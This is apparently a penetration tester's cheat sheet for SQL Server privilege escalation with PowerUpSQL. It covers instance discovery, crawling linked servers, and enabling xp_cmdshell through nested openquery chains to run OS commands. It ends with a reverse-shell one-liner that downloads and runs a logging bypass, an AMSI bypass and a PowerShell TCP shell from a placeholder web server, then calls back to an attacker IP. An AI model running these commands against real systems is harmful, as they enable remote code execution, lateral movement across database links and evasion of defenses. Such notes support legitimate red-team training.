---
tags:
  - privesc
cssclasses: []
---
SQL Servers

```powershell title:"Import PowerUpSQL"
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.ps1
. C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.ps1
```

```powershell title:"Discovery (SPN Scanning)"
Get-SQLInstanceDomain
```

```powershell title:"Check Accessibility"
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

```powershell title:"Gather Information"
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

- A database link allows SQL Server to access external data sources like other SQL servers and OLE DB data sources.
- In case of database links between SQL servers, that is, linked SQL servers, it is possible to execute stored procedures.
- Database links work even across forest trusts.

```powershell title:"Look for links to remote servers"
Get-SQLServerLink -Instance sql-machine -Verbose
```

```sql title:"Look for links to remote servers"
select * from master..sysservers
```

- Openquery() function can be used to run queries on a linked database

```sql title:"Enumerating Database Link manually"
select * from openquery("sql-machine", 'select * from master..sysservers')
```

```powershell title:"Enumerating Database links"
Get-SQLServerLinkCrawl -Instance sql-machine -Verbose
```

```sql title:"Enumerate nested links"
select * from openquery("sql-machine", 'select * from openquery("sql-machine-next", "select * from master..sysservers")')
```

#### Executing Commands

- On the target server, either xp_cmdshell should be already enabled; or
- If rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:

```sql title:"Execute commands"
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "sql-machine"
```

Use the -QueryTarget parameter to run Query on a specific instance (without -QuertyTarget the command tries to use xp_cmdshell on every link of the chain)

```powershell title:"nothing"
Get-SQLServerLinkCrawl -Instance sql-machine-starting -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget sql-machine
```

```sql title:"From the initial SQL server, OS commands can be executed using nested link queries:"
select * from openquery("sql-machine",'select * from openquery("sql-machine-next","select * from openquery("outer-sql-machine", ""select @@version as version;exec master..xp_cmdshell "powershell whoami)"")")')
```

```powershell title:"Reverse Shell"
Get-SQLServerLinkCrawl -Instance first-instance -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://your.webserver/sbloggingbypass.txt);iex(iwr -UseBasicParsing http://your.webserver/amsibypass);iex (iwr -UseBasicParsing http://your.webserver/Invoke-PowershellTcp.ps1);Power -Reverse -IPAddress foothold.ip -Port listening.port"''' -QueryTarget last.node
```

